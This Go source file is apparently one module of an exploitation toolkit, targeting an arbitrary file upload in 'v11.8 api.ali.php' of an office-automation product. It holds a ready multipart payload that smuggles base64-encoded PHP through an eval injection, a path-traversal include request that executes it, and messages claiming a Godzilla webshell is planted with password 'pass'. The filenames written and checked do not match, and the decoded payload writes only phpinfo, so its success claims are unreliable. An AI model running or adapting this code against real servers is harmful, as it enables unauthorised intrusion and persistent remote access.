package vulners

import (
	//"strings"
	//"fmt"

	"strings"
	"time"

	"github.com/fatih/color"
)

type Td08 struct {
}

func (c *Td08) Scan(targetUrl string) {
	vulnerable, err := Td08scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td08] 可能存在v11.8 api.ali.php 任意文件上传，请执行Exp模块进行验证")
	} else {
		color.White("[Td08] 不存在v11.8 api.ali.php 任意文件上传")
	}
}

func (*Td08) Exploit(targetUrl string) {
	runResult, err := Td08runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		url6 := "/fb6790f7.php"
		WebShellUrl := targetUrl + url6
		color.Green(runResult+"%s", WebShellUrl)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td08scancore(targetUrl string) (bool, error) {
	url := "/mobile/api/api.ali.php"
	data := `--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream

{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
--502f67681799b07e4de6b503655f5cae--`
	resp1, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	//resContent := resp.String()
	if resp1.StatusCode == 200 {
		return true, nil
	} else {
		return false, nil
	}
}

func Td08runcore(targetUrl string) (string, error) {
	url := "/mobile/api/api.ali.php"
	data := `--502f67681799b07e4de6b503655f5cae
Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
Content-Type: application/octet-stream

{"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
--502f67681799b07e4de6b503655f5cae--`

	resp2, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	if resp2.StatusCode == 200 {
		timer := time.Now()
		url2 := "/inc/package/work.php?id=../../../../../myoa/attach/approve_center/"
		url3 := timer.Format("0601")
		url4 := "/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.fb6790f4"
		resp3, err := baseClient.
			NewRequest().
			Get(targetUrl + url2 + url3 + url4)
		if err != nil {
			return "", err
		}
		resContent3 := resp3.String()
		if strings.Contains(resContent3, "+OK") {
			url5 := "/fb6790f7.php"
			resp4, err := baseClient.
				NewRequest().
				Get(targetUrl + url5)
			if err != nil {
				return "", err
			}
			//resContent4 := resp4.String()
			if resp4.StatusCode == 200 {
				return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshell地址：", nil
			} else {
				return "", err
			}
		} else {
			url6 := "/inc/package/work.php?id=../../../../../MYOA/attach/approve_center"
			resp5, err := baseClient.
				NewRequest().
				Get(targetUrl + url6 + url3 + url4)
			if err != nil {
				return "", err
			}
			resContent5 := resp5.String()
			if strings.Contains(resContent5, "+OK") {
				url7 := "/fb6790f7.php"
				resp6, err := baseClient.
					NewRequest().
					Get(targetUrl + url7)
				if err != nil {
					return "", err
				}
				if resp6.StatusCode == 200 {
					return "[Td08] 存在v11.8 api.ali.php 任意文件上传\n已上传哥斯拉WebShell\n密码pass\n密钥key\n加密器PHP_XOR_BASE64\nWebshell地址： /fb6790f7.php", nil
				} else {
					return "", nil
				}

			} else {
				return "", nil
			}

		}
	} else {
		return "", nil
	}
}
